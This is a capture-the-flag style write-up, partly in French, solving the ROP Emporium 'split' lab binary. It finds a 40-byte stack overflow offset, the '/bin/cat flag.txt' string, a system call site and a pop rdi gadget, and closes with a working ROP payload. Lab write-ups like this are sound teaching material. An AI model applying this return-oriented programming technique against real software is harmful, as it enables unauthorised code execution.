#  RopEmporium : split

## TLDR


Call a function with parameter from binary
- Get param addr 
- Get fct addr 
- bufferoffset + gadget(pop ;ret) + string addr + function addr 


## Checksec 

```
$ checksec split
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
NX -> rop 

## Buffer size

```gdb
gdb-peda$ pattern_create 200 pattern

Writing pattern of 200 chars to filename "pattern"
gdb-peda$ r < pattern

Program received signal SIGSEGV, Segmentation fault.
RSP: 0x7fffffffdc58 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA`\a@")
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdc58 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA`\a@")
Stopped reason: SIGSEGV
0x0000000000400741 in pwnme ()

gdb-peda$ pattern offset AA0AAFAA
AA0AAFAA found at offset: 40

gdb-peda$ find "/bin/cat"
Searching for '/bin/cat' in: None ranges
Found 1 results, display max 1 items:
split : 0x601060 ("/bin/cat flag.txt")
```
offset => 40 bytes



## Get string 'cat flag.txt' address 

```
$ objdump -s split
 601060 2f62696e 2f636174 20666c61 672e7478  /bin/cat flag.tx
 601070 7400                                 t.              
```
=> 601060

```
peda: find "/bin/cat" 
```


## Get 'call system()' address 

```
$ r2 split
 -- 256 colors ought to be enough for anybody
[0x004005b0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze all functions arguments/locals
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information (aanr)
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x004005b0]> afl
0x004005b0    1 42           entry0
0x004005f0    4 42   -> 37   sym.deregister_tm_clones
0x00400620    4 58   -> 55   sym.register_tm_clones
0x00400660    3 34   -> 29   sym.__do_global_dtors_aux
0x00400690    1 7            entry.init0
0x004006e8    1 90           sym.pwnme
0x00400580    1 6            sym.imp.memset
0x00400550    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x00400742    1 17           sym.usefulFunction
0x00400560    1 6            sym.imp.system
0x004007d0    1 2            sym.__libc_csu_fini
0x004007d4    1 9            sym._fini
0x00400760    4 101          sym.__libc_csu_init
0x004005e0    1 2            sym._dl_relocate_static_pie
0x00400697    1 81           main
0x004005a0    1 6            sym.imp.setvbuf
0x00400528    3 23           sym._init
[0x004005b0]> 
```
0x00400560     sym.imp.system
On va chercher un call vers cette fct
```
$ objdump -d split | grep call
  40074b:       e8 10 fe ff ff          callq  400560 <system@plt>
```
=> 0x40074b call system

```
0x004005b0]> pdf @ sym.usefulFunction
┌ 17: sym.usefulFunction ();
│           0x00400742      55             push rbp
│           0x00400743      4889e5         mov rbp, rsp
│           0x00400746      bf4a084000     mov edi, str._bin_ls        ; 0x40084a ; "/bin/ls" ; const char *string
│           0x0040074b      e810feffff     call sym.imp.system         ; int system(const char *string)
│           0x00400750      90             nop
│           0x00400751      5d             pop rbp
└           0x00400752      c3             ret
``` 
=> 0x0040074b     call sym.imp.system

Q: pourquoi ça ne passe pas avec 0x400560 directement ?




## Gadget pop rdi;ret 

```
$ ROPgadget --binary split | grep "pop rdi"
0x00000000004007c3 : pop rdi ; ret
```

=> 0x00000000004007c3


## Payload 


gadget_addr=p64(0x00000000004007c3)
param_addr=p64(0x601060)
fct_system_addr=p64(0x0040074b) 

payload  = b'A' * 40
payload += gadget_addr+param_addr+fct_system_addr